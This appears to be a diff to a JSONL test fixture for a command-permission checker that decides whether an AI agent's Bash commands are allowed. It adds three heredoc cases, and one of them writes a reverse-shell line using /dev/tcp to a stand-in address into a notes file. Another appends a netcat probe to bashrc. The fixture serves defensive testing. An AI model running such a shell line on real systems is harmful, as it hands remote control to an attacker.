@@ -338,3 +338,6 @@
 {"tool": "Bash", "args": {"command": "setcap 021+ep x"}, "expect": "allow", "note": "setcap granting capability 17 (octal 021), not a held one (#850)"}
 {"tool": "Bash", "args": {"command": "install --mod=0755 x /usr/local/bin/x"}, "expect": "allow", "note": "an ordinary install mode via a GNU prefix of --mode (#834)"}
 {"tool": "Bash", "args": {"command": "django-admin flush --help"}, "expect": "allow", "note": "asking for help on django-admin flush runs nothing (#742)"}
+{"tool": "Bash", "args": {"command": "cat >> ~/.bashrc <<'EOF'\nexport PATH=$PATH:~/bin\nEOF"}, "expect": "allow", "note": "an ordinary heredoc edit to bashrc stays as it is (#996)"}
+{"tool": "Bash", "args": {"command": "cat >> notes.md <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF"}, "expect": "allow", "note": "a heredoc body starting a network shell, written to a plain file (#996)"}
+{"tool": "Bash", "args": {"command": "cat >> ~/.bashrc <<'EOF'\nnc -zv localhost 80\nEOF"}, "expect": "allow", "note": "a heredoc body with a netcat probe and no exec option stays as it is (#996)"}
